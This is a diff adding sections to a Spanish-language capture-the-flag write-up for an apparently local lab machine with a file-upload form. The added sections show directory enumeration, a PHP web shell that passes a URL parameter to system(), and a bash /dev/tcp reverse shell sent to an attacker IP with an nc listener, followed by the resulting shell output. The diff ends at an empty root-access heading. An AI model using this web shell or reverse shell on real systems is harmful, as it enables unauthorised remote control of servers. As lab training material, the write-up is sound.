@@ -75,6 +75,17 @@ PORT   STATE SERVICE VERSION
 
 ---
 
+## Visualización de la página principal
+
+- **http://172.17.0.2**
+
+  Como se puede observar, la página de inicio es un formulario que nos permite subir archivos a un servidor.
+
+  ![image](https://github.com/user-attachments/assets/83047ec1-69f6-49c1-9058-1d2083f8b4d2)
+
+ 
+
+
 ## Enumeración de Directorios con Gobuster
 
 ```python
@@ -92,6 +103,8 @@ PORT   STATE SERVICE VERSION
 ...
 ```
 
+De acuerdo a la enumeración de directorios, es posible acceder la ruta `/uploads`, en donde encontraremos todos los archivos que se suban al servidor.
+
 **Explicación de parámetros:**
 
 - `dir`: Modo de enumeración de directorios.
@@ -100,4 +113,79 @@ PORT   STATE SERVICE VERSION
 - `-t 200`: Define el número de hilos a usar (200 en este caso).
 - `--no-error`: Oculta los errores emitidos por Gobuster.
 
+#### **http://172.17.0.2/uploads**
+
+![image](https://github.com/user-attachments/assets/f67412f7-3bfc-41ae-affa-4ecdfe12fabb)
+
+
+
 ---
+
+## Escalada de privilegios.
+
+En este caso, al tener acceso a la ruta en la que se alamacenan los archivos subidos, se puede intentar subir un archivo con extensión `.php`, el cual contendrá un script que permitirá la ejecución de una reverse shell.
+
+El archivo que se subirá tendrá el nombre: reverse.php
+
+### **Explicación de reverse.php**
+```php
+<?php
+        system($_GET['rev']);
+?>
+```
+
+- `<?php ... ?> ` :  Esto indica el inicio y el fin de un bloque de código.
+- `system($_GET['rev']);` :  En esta línea ocurre la operación principal.
+- `system()` :  Esta funcón de PHP, dicha función, ejecuta un comando directamente del sistema operativo y muestra la salida.
+- `$_GET['rev']` :  $_GET es un array superglobal que recoge los datos enviados a través de la consulta de la URL (`?rev=comando`) usando el método GET. En este caso, está buscando un parámetro llamado `rev`. 
+
+Antes de ponerlo a prueba, es necesario subir el script a el servidor.
+  
+ ![image](https://github.com/user-attachments/assets/d69ce36a-c297-452e-85de-ae09e618eb3a)
+
+### **Ejemplo de uso de reverse.php**
+
+**http://172.17.0.2/uploads/reverse.php?rev=whoami**
+
+- `http://172.17.0.2/uploads/reverse.php`: Esta parte especifica la ubicación del archivo `reverse.php` en el servidor.
+- `?rev=whoami`: Esto pasa el valor "whoami" a la variable `$_GET['rev']` en el archivo PHP. Este valor es el comando de linux que nos permite saber el nombre del usuario actual, si el funcionamiento del script es correcto, motrará un texto similar a `www-data` en el navegador, como se muestra en la imagen de abajo.
+
+![image](https://github.com/user-attachments/assets/68eead14-ecc8-49c8-95e9-1cceb69883ea)
+
+### **Ejecución de la reverse shell**
+
+http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"
+
+- `bash -c`: Ejecuta el siguiente comando en una nueva instancia de bash. Esto permite aislar la ejecución del comando del entorno actual.
+- `bash -i` :Ejecuta bash en modo interactivo. Esto crea una nueva sesión de shell interactiva, permitiendo al usuario ingresar comandos.
+- `>%26`: Redirige tanto la salida estándar (stdout) como la entrada estándar de error (stderr) al dispositivo especificado.
+- `/dev/tcp/192.168.1.100/6969`: Es un "archivo" especial en sistemas Linux que establece una conexión TCP a la dirección IP 192.168.1.100 en el puerto 6969. Toda la salida y los errores se envían a esta conexión. La IP cambiará en cada dispositivo, se puede comprobar con el comando `ifconfig` o `ip addr`.
+- `0>%261`: Redirige la entrada estándar (stdin) de la shell a la misma conexión TCP. Esto permite una comunicación interactiva a través de la conexión de red.
+
+#### Proceso:
+
+- **Fase de Preparación**: El atacante inicia un listener en su máquina en el puerto 6969 utilizando el comando `nc -lvnp 6969`. Esto prepara la máquina atacante para recibir la conexión de la reverse shell.
+```python
+~/Upload ᐅ nc -lvnp 6969
+listening on [any] 6969 ...
+```
+
+- **Ejecución**: Al acceder a la URL `http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`, el archivo `reverse.php` ejecuta el comando enviado a través del parámetro `rev`. Este comando inicia una conexión desde la máquina víctima a la máquina atacante.
+```python
+listening on [any] 6969 ...
+connect to [192.168.1.100] from (UNKNOWN) [172.17.0.2] 41906
+bash: cannot set terminal process group (25): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@c925d2eea10b:/var/www/html/uploads$
+```
+
+- **Resultado**: Una vez ejecutado el comando, la máquina víctima establece una conexión con la máquina atacante, permitiendo al atacante obtener una shell interactiva con el usuario `www-data`.
+```python
+www-data@c925d2eea10b:/var/www/html/uploads$ whoami
+whoami
+www-data
+```
+
+### **Acceso root**
+
+
